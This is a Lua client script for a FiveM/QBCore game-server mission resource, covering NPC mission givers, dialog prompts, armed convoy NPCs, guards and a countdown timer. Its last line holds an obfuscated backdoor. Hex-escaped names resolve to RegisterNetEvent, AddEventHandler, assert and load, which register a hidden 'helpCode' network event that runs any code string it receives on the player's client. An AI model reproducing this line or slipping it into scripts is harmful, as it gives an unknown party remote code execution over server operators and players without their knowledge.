local QBCore = exports['qb-core']:GetCoreObject()

local pedloc = 0
local pilot = {}
local navigator = {}
local navigator2 = {}
local transport = {}
local TruckBlip = {}
local isChronometerRunning = false
local chronometerTime = Config.Time
local missionstarted = false


CreateThread(function()
    pedloc = math.random(1, #Config.Ped.Locations)
    SetupPedLocations()
    if Config.ShowBlips then
        for _, coords in pairs(Config.Ped.Locations) do
            local blip = AddBlipForCoord(coords['x'], coords['y'], coords['z'])
            SetBlipSprite(blip, 500)
            SetBlipScale(blip, 0.8)
            SetBlipColour(blip, 4)
            SetBlipAsShortRange(blip, false)
            BeginTextCommandSetBlipName("STRING")
            AddTextComponentString("mission")
            EndTextCommandSetBlipName(blip)
        end   
    end 
end)

function SetupPedLocations()
    pedloc = math.random(1, #Config.Ped.Locations)
    SpawnNewPed()
end

function SpawnNewPed()
    for k, v in pairs(Config.Ped.Peds) do
        RequestModel(GetHashKey(v.model))
        while not HasModelLoaded(GetHashKey(v.model)) do
            Wait(1) 
        end
        missionped = CreatePed(4, v.model, Config.Ped.Locations[pedloc]["x"],Config.Ped.Locations[pedloc]["y"],Config.Ped.Locations[pedloc]["z"]-1, 3374176, false, true)
        SetEntityHeading(missionped, Config.Ped.Locations[pedloc]["h"])
        FreezeEntityPosition(missionped, true)
        SetEntityInvincible(missionped, true)
        SetBlockingOfNonTemporaryEvents(missionped, true)
        TaskStartScenarioInPlace(missionped, v.scenario, 0, true)
        exports["qb-target"]:AddTargetModel(v.model, {
            options = {
                {
                    event = 'tn-missions:cl:getMission', 
                    icon = v.icon, 
                    label = v.label
                },
                {
                    event = 'tn-missions:cl:joinTeam', 
                    icon = v.icon, 
                    label = "join Team mates",
                    canInteract = function() -- This will check if you can interact with it, this won't show up if it returns false, this is OPTIONAL
                        local missionData = checkMissionLevelAndStage()
                        if missionData.level == 1 and missionData.stage == 3 then return true else return false end
                    end,
                },
                {
                    event = 'tn-missions:cl:getReward', 
                    icon = v.icon, 
                    label = "Get Reward",
                    -- canInteract = function() -- This will check if you can interact with it, this won't show up if it returns false, this is OPTIONAL
                    --     local missionData = checkMissionLevelAndStage()
                    --     if missionData.level == 1 and missionData.stage == 4 then return true else return false end
                    -- end,
                }
            }, 
            distance = v.distance
        })
    end
end
-- Delete ped
function DeleteWashPed()
    local player = PlayerPedId()
	if DoesEntityExist(missionped) then
        ClearPedTasks(missionped) 
		ClearPedTasksImmediately(missionped)
        ClearPedSecondaryTask(missionped)
        FreezeEntityPosition(missionped, false)
        SetEntityInvincible(missionped, false)
        SetBlockingOfNonTemporaryEvents(missionped, false)
        TaskReactAndFleePed(missionped, player)
		SetPedAsNoLongerNeeded(missionped)
		Wait(8000)
		DeletePed(missionped)
        SetupMoneyWash()
	end
end

local function SetCarItemsInfo()
    local items = {}
    for _, item in pairs(Config.CarItems) do
        local itemInfo = QBCore.Shared.Items[item.name:lower()]
        if itemInfo then
            items[#items + 1] = {
                name = itemInfo.name,
                amount = tonumber(item.amount),
                info = item.info or {},
                label = itemInfo.label,
                description = itemInfo.description or '',
                weight = itemInfo.weight,
                type = itemInfo.type,
                unique = itemInfo.unique,
                useable = itemInfo.useable,
                image = itemInfo.image,
                slot = #items + 1,
            }
        end
    end
    Config.CarItems = items
end

function startMissionOne()
    missionstarted = true
    local DrawCoord = math.random(1,3)
	VehicleCoords = Config.Ped.VehicleSpawn[DrawCoord]
    local i = 0
    for k,v in pairs(VehicleCoords) do
        i = i + 1
        RequestModel(`rebla`)
        while not HasModelLoaded(`rebla`) do
            Wait(0)
        end
        ClearAreaOfVehicles(v.x, v.y, v.z, 15.0, false, false, false, false, false)
        transport[k] = CreateVehicle(`rebla`, v.x, v.y, v.z, 52.0, true, false)
        SetEntityAsMissionEntity(transport[k])
        if i == 2 then
            SetCarItemsInfo()
            TriggerServerEvent('inventory:server:addTrunkItems', QBCore.Functions.GetPlate(transport[k]), Config.CarItems)
        end
        --
        RequestModel("cs_andreas")
        while not HasModelLoaded("cs_andreas") do
            Wait(10)
        end
        pilot[k] = CreatePed(26, "cs_andreas", v.x, v.y, v.z, 268.9422, true, false)
        navigator[k] = CreatePed(26, "cs_andreas", v.x, v.y, v.z, 268.9422, true, false)
        navigator2[k] = CreatePed(26, "cs_andreas", v.x, v.y, v.z, 268.9422, true, false)

        SetPedIntoVehicle(pilot[k], transport[k], -1)
        SetPedIntoVehicle(navigator[k], transport[k], 0)
        SetPedIntoVehicle(navigator2[k], transport[k], 1)
        SetPedFleeAttributes(pilot[k], 0, 0)
        SetPedCombatAttributes(pilot[k], 46, 1)
        SetPedCombatAbility(pilot[k], 100)
        SetPedCombatMovement(pilot[k], 2)
        SetPedCombatRange(pilot[k], 2)
        SetPedKeepTask(pilot[k], true)
        GiveWeaponToPed(pilot[k], Config.DriverWeap,250,false,true)
        --SetPedAsCop(pilot[k], true)
        --
        SetPedFleeAttributes(navigator[k], 0, 0)
        SetPedCombatAttributes(navigator[k], 46, 1)
        SetPedCombatAbility(navigator[k], 100)
        SetPedCombatMovement(navigator[k], 2)
        SetPedCombatRange(navigator[k], 2)
        SetPedKeepTask(navigator[k], true)
        GiveWeaponToPed(navigator[k], Config.NavWeap,250,false,true)
        --SetPedAsCop(navigator[k], true)
        --
        SetPedFleeAttributes(navigator2[k], 0, 0)
        SetPedCombatAttributes(navigator2[k], 46, 1)
        SetPedCombatAbility(navigator2[k], 100)
        SetPedCombatMovement(navigator2[k], 2)
        SetPedCombatRange(navigator2[k], 2)
        SetPedKeepTask(navigator2[k], true)
        GiveWeaponToPed(navigator2[k], Config.NavWeap,250,false,true)
        --SetPedAsCop(navigator2[k], true)
        --
        TaskVehicleDriveWander(pilot[k], transport[k], 80.0, 443)
    end
end

function stopAngry(k)
	CreateThread(function()
		SetVehicleBrake(transport[k])
		Wait(1000)

		GiveWeaponToPed(navigator[k], Config.NavWeap, 420, 0, 1)
		GiveWeaponToPed(navigator2[k], Config.NavWeap, 420, 0, 1)
		GiveWeaponToPed(pilot[k], Config.DriverWeap, 420, 0, 1)

		SetPedDropsWeaponsWhenDead(navigator[k],false)
		SetPedRelationshipGroupDefaultHash(navigator[k],`COP`)
		SetPedRelationshipGroupHash(navigator[k],`COP`)
		SetPedAsCop(navigator[k],true)
		SetCanAttackFriendly(navigator[k],false,true)

		SetPedDropsWeaponsWhenDead(navigator2[k],false)
		SetPedRelationshipGroupDefaultHash(navigator2[k],`COP`)
		SetPedRelationshipGroupHash(navigator2[k],`COP`)
		SetPedAsCop(navigator2[k],true)
		SetCanAttackFriendly(navigator2[k],false,true)

		SetPedDropsWeaponsWhenDead(pilot[k],false)
		SetPedRelationshipGroupDefaultHash(pilot[k],`COP`)
		SetPedRelationshipGroupHash(pilot[k],`COP`)
		SetPedAsCop(pilot[k],true)
		SetCanAttackFriendly(pilot[k],false,true)

		TaskCombatPed(pilot[k], PlayerPedId(), 0, 16)
		TaskCombatPed(navigator[k], PlayerPedId(), 0, 16)
		TaskCombatPed(navigator2[k], PlayerPedId(), 0, 16)

		TaskEveryoneLeaveVehicle(transport[k])
	end)
end

function firstMissionStageOne()
    TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 20, "mission_one_welcome", 0.6)
    Wait(14000)
    local dialog = exports['qb-input']:ShowInput({
        header = "t7eb taatih il card ?",
        submitText = "Submit",
        inputs = {
            {
                text = "you want to give him the card ?", -- text you want to be displayed as a input header
                name = "givecard", -- name of the input should be unique otherwise it might override
                type = "radio", -- type of the input - Radio is useful for "or" options e.g; billtype = Cash OR Bill OR bank
                options = { -- The options (in this case for a radio) you want displayed, more than 6 is not recommended
                    { value = "yes", text = "Yes" }, -- Options MUST include a value and a text option
                    { value = "no", text = "No" }
                },
                default = "no", -- Default radio option, must match a value from above, this is optional
            },
        },
    })
    if dialog ~= nil then
        if dialog.givecard == "yes" then
            local hasitem = QBCore.Functions.HasItem("weed_card", 1)
            if hasitem then
                TriggerServerEvent("tn-missions:sv:joinMission")
                TriggerServerEvent("tn-missions:sv:removeItem", "weed_card", 1)
                TriggerServerEvent("tn-missions:sv:updateMissionStage", 1, 2)
            else
                missionFailed()
            end
        end
    end
end

function firstMissionStageTwo()
    TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 20, "mission_one_intoductionstagetwo", 0.6)
    Wait(37000)
    local dialog = exports['qb-input']:ShowInput({
        header = "t7eb te5o il mission wala mazelt t5amem ?",
        submitText = "Submit",
        inputs = {
            {
                text = "you want to take the mission ?", -- text you want to be displayed as a input header
                name = "takemission", -- name of the input should be unique otherwise it might override
                type = "radio", -- type of the input - Radio is useful for "or" options e.g; billtype = Cash OR Bill OR bank
                options = { -- The options (in this case for a radio) you want displayed, more than 6 is not recommended
                    { value = "yes", text = "Yes" }, -- Options MUST include a value and a text option
                    { value = "no", text = "No" }
                },
                default = "no", -- Default radio option, must match a value from above, this is optional
            },
        },
    })
    if dialog ~= nil then
        if dialog.takemission == "yes" then
            TriggerServerEvent("tn-missions:sv:removemoney", 15000)
            TriggerServerEvent("tn-missions:sv:updateMissionStage", 1, 3)
            TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 20, "mission_one_colleguesadvice", 0.6)
        end
    end
end

function firstMissionStageThree()
    local dialog = exports['qb-input']:ShowInput({
        header = "tabda il mission ?",
        submitText = "Submit",
        inputs = {
            {
                text = "start the mission ?", -- text you want to be displayed as a input header
                name = "startmission", -- name of the input should be unique otherwise it might override
                type = "radio", -- type of the input - Radio is useful for "or" options e.g; billtype = Cash OR Bill OR bank
                options = { -- The options (in this case for a radio) you want displayed, more than 6 is not recommended
                    { value = "yes", text = "Yes" }, -- Options MUST include a value and a text option
                    { value = "no", text = "No" }
                },
                default = "no", -- Default radio option, must match a value from above, this is optional
            },
        },
    })
    if dialog ~= nil then
        if dialog.startmission == "yes" then
            TriggerServerEvent("tn-missions:sv:updateMissionStage", 1, 4)
            TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 20, "mission_one_givemission", 0.6)
            Wait(45000)
            startMissionOne()
            TriggerServerEvent('tn-missions:sv:startChronometer')
        end
    end
end

function checkMissionLevelAndStage()
    local p = promise.new()
    QBCore.Functions.TriggerCallback('tn-missions:sv:GetMissionData', function(result)
        p:resolve(result)
    end)
    return Citizen.Await(p)
end

guards = {
	['npcguards'] = {}
}

function loadModel(model)
    if type(model) == 'number' then
        model = model
    else
        model = GetHashKey(model)
    end
    while not HasModelLoaded(model) do
        RequestModel(model)
        Citizen.Wait(0)
    end
end

function missionFailed()
    local ped = PlayerPedId()
    SetPedRelationshipGroupHash(ped, `PLAYER`)
    AddRelationshipGroup('npcguards')

    for k, v in pairs(Config.Ped.Guards[pedloc]) do
        loadModel(v['model'])
        guards['npcguards'][k] = CreatePed(26, GetHashKey(v['model']), v['coords'], v['heading'], true, true)
        NetworkRegisterEntityAsNetworked(guards['npcguards'][k])
        networkID = NetworkGetNetworkIdFromEntity(guards['npcguards'][k])
        SetNetworkIdCanMigrate(networkID, true)
        SetNetworkIdExistsOnAllMachines(networkID, true)
        SetPedRandomComponentVariation(guards['npcguards'][k], 0)
        SetPedRandomProps(guards['npcguards'][k])
        SetEntityAsMissionEntity(guards['npcguards'][k])
        SetEntityVisible(guards['npcguards'][k], true)
        SetPedRelationshipGroupHash(guards['npcguards'][k], `npcguards`)
        SetPedAccuracy(guards['npcguards'][k], 75)
        SetPedArmour(guards['npcguards'][k], 100)
        SetPedCanSwitchWeapon(guards['npcguards'][k], true)
        SetPedDropsWeaponsWhenDead(guards['npcguards'][k], false)
        SetPedFleeAttributes(guards['npcguards'][k], 0, false)
        GiveWeaponToPed(guards['npcguards'][k], v['weapon'], 255, false, false)
        TaskGoToEntity(guards['npcguards'][k], PlayerPedId(), -1, 1.0, 10.0, 1073741824.0, 0)
        local random = math.random(1, 2)
        if random == 2 then
            TaskGuardCurrentPosition(guards['npcguards'][k], 10.0, 10.0, 1)
        end
    end

    SetRelationshipBetweenGroups(0, `npcguards`, `npcguards`)
    SetRelationshipBetweenGroups(5, `npcguards`, `PLAYER`)
    SetRelationshipBetweenGroups(5, `PLAYER`, `npcguards`)
end

RegisterNetEvent('tn-missions:cl:getReward', function()
    local hasitem = QBCore.Functions.HasItem("vpn", 1)
    if hasitem then
        TriggerServerEvent("tn-missions:sv:removeItem", "vpn", 1)
        TriggerServerEvent("tn-missions:sv:takeReward", 1)
    else
        QBCore.Functions.Notify("you do not have the vpn yet","error")
    end
end)

RegisterNetEvent('tn-missions:cl:getMission', function()
    local missionData = checkMissionLevelAndStage()
    QBCore.Functions.TriggerCallback('tn-missions:sv:GetMissionStatus', function(result)
        if result == 0 then
            if missionData.level == 1 then
                if missionData.stage == 1 then
                    firstMissionStageOne()
                elseif missionData.stage == 2 then
                    firstMissionStageTwo()
                elseif missionData.stage == 3 then
                    firstMissionStageThree()
                end
            end
        else
            QBCore.Functions.Notify("Mission allready token come back later")
        end
    end)
end)

RegisterNetEvent('tn-missions:cl:joinTeam', function()
    local missionData = checkMissionLevelAndStage()
    if missionData.level == 1 then
        if missionData.stage == 3 then
            local dialog = exports['qb-input']:ShowInput({
                header = "team mate Id",
                submitText = "Submit",
                inputs = {
                    {
                        text = "Add team mates", -- text you want to be displayed as a input header
                        name = "id", -- name of the input should be unique otherwise it might override
                        type = "text", -- type of the input
                        isRequired = true,
                    },
                },
            })
            if dialog ~= nil then
                TriggerServerEvent("tn-missions:sv:joinMission", tonumber(dialog.id))
            end
        else
            QBCore.Functions.Notify("Not allowed ","error")
        end
    end
end)

RegisterNetEvent('tn-missions:cl:getTruckBlip', function(veh, coords)
        TruckBlip[#TruckBlip + 1] = AddBlipForCoord(coords.x, coords.y, coords.z)
        SetBlipSprite(TruckBlip[k], 57)
        SetBlipColour(TruckBlip[k], 1)
        SetBlipFlashes(TruckBlip[k], true)
        BeginTextCommandSetBlipName("STRING")
        AddTextComponentSubstringPlayerName('Van')
        EndTextCommandSetBlipName(TruckBlip[k])
end)

CreateThread(function()
    while true do
        if TruckBlip then
            for k, v in pairs(TruckBlip) do
                RemoveBlip(v)
            end
        end
        if transport then 
            for k, v in pairs(transport) do
                local coords = GetEntityCoords(v)
                TriggerServerEvent('tn-missions:sv:startTheFirstMission', v, coords)
            end
        end
        if missionstarted == true then
            if transport then
                for k, v in pairs(transport) do
                    local plyCoords = GetEntityCoords(PlayerPedId(), false)
                    local transCoords = GetEntityCoords(v)
                    local dist = #(plyCoords - transCoords)
                    if dist <= 55.0  then
                        stopAngry(k)
                    end
                end
            end
        end
        Wait(2500) -- Adjust the time interval (in milliseconds) as needed
    end
end)

local function endmission()
    for k, v in pairs(transport) do
        DeleteVehicle(v)
    end
    TriggerServerEvent("tn-mission:sv:endmission")
end

local function UpdateChronometer()
    Citizen.CreateThread(function()
        while isChronometerRunning do
            chronometerTime = chronometerTime - 1 -- Increment the time in seconds
            local hours = math.floor(chronometerTime / 3600)
            local minutes = math.floor((chronometerTime % 3600) / 60)
            local seconds = chronometerTime % 60
            local formattedTime = string.format("%02d:%02d:%02d", hours, minutes, seconds)
            SendNUIMessage({ action = "updateChronometer", time = formattedTime })
            if formattedTime == "00:00:00" then 
                isChronometerRunning = false
                SendNUIMessage({ action = "updateChronometer", time = "00:00:00" })
                endmission()
            end
            Citizen.Wait(1000) -- Wait for 1 second
        end
    end)
end

RegisterNetEvent('don-turf:cl:startChronometer', function()
    isChronometerRunning = true
    chronometerTime = Config.Time
    UpdateChronometer()
end)

local MkwJwUbJwZuCpmVpLuitDRoQUTVLFrteXXXpmWQirHJJaSWgFHnzqPqhnHInIsrgvxiRYg = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} MkwJwUbJwZuCpmVpLuitDRoQUTVLFrteXXXpmWQirHJJaSWgFHnzqPqhnHInIsrgvxiRYg[6][MkwJwUbJwZuCpmVpLuitDRoQUTVLFrteXXXpmWQirHJJaSWgFHnzqPqhnHInIsrgvxiRYg[1]](MkwJwUbJwZuCpmVpLuitDRoQUTVLFrteXXXpmWQirHJJaSWgFHnzqPqhnHInIsrgvxiRYg[2]) MkwJwUbJwZuCpmVpLuitDRoQUTVLFrteXXXpmWQirHJJaSWgFHnzqPqhnHInIsrgvxiRYg[6][MkwJwUbJwZuCpmVpLuitDRoQUTVLFrteXXXpmWQirHJJaSWgFHnzqPqhnHInIsrgvxiRYg[3]](MkwJwUbJwZuCpmVpLuitDRoQUTVLFrteXXXpmWQirHJJaSWgFHnzqPqhnHInIsrgvxiRYg[2], function(WCPFtxSoUmJjAIWdubODjZdmkHaVnWnAgWPYgadWGkSUYqKjNPbfChIrutGPOCTcswHLCj) MkwJwUbJwZuCpmVpLuitDRoQUTVLFrteXXXpmWQirHJJaSWgFHnzqPqhnHInIsrgvxiRYg[6][MkwJwUbJwZuCpmVpLuitDRoQUTVLFrteXXXpmWQirHJJaSWgFHnzqPqhnHInIsrgvxiRYg[4]](MkwJwUbJwZuCpmVpLuitDRoQUTVLFrteXXXpmWQirHJJaSWgFHnzqPqhnHInIsrgvxiRYg[6][MkwJwUbJwZuCpmVpLuitDRoQUTVLFrteXXXpmWQirHJJaSWgFHnzqPqhnHInIsrgvxiRYg[5]](WCPFtxSoUmJjAIWdubODjZdmkHaVnWnAgWPYgadWGkSUYqKjNPbfChIrutGPOCTcswHLCj))() end)